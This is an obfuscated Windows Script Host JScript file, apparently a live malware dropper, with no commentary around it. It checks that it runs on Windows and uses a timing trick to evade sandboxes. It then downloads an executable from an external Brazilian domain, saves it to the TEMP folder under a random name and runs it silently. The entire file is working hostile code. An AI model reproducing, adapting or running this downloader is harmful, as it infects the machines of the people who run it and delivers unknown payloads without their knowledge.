var n0 = false;
var Du = "CreateObject";
var zt = function W() {return WScript[Du]("WScript.Shell");}(), Fk = 11;
var wY = "MSXML2.XMLHTTP";
var e = 2123213;
var Z = 0;
function s(md){zt["Run"](md, Z, Z);};
function L(){return "" + wY;};
function n(i, m0){Z = Z * 1; return i - m0;};
function xV(){return Du;};
/*@cc_on
  @if (@_win32 || @_win64)
    n0 = true;
  @end
@*/
if (n0)
{
var D = "";
function b(){return 22;};
var e0 = 0; var M0 = 0;
function k()
{
var a = new this["Date"]();
var qh = a["getUTCMilliseconds"]();
WScript["Sleep"](b());
var a = new this["Date"]();
var v = a["getUTCMilliseconds"]();
WScript["Sleep"](b());
var a = new this["Date"]();
var WM = a["getUTCMilliseconds"]();
var e0 = "mh";
e0 = n(v, qh);
var M0 = "m";
M0 = n(WM, v);
D = "open";
return n(e0, M0);
}
var Os = false;
var r = false;
for (var lt = Z; lt < b() * 1; lt++){if (k() != Z){
Os = true; 
M0 = "31" + 11 * e0 + M0; 
r = true; 
break;
}}
function F() {return ((Os == true) && (Os == r)) ? 1 : Z;};
if (Os && F() && r){
function M() {return zt["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "N9c0AyBIuVz9Xh5f.exe";};
 E = L();
 Qa = WScript[Du](E);
 var R = 1;
 while (R){
try {
Qa[D]("GET", "http://digimacro.com.br/m8isda", false);
Qa["send"]();
kO = "Sleep";
for (;;){WScript[kO](b() * 11); if (Qa["readystate"] >= 2 * 2) break;};
R = Z;
} catch(S){};
}
function YV(rG) {var KB = (1, 2, 3, 4, 5, rG); return KB;};
j = WScript[xV()]("ADODB.Stream");
E = j;
E[D]();
E["type"] = YV(1);
E["write"](Qa["ResponseBody"]);
j["position"] = YV(Z);
E["Save" + "ToFile"](M(), 2);
j["c"+"lose"]();
Ll = M();
s(Ll);
}
}

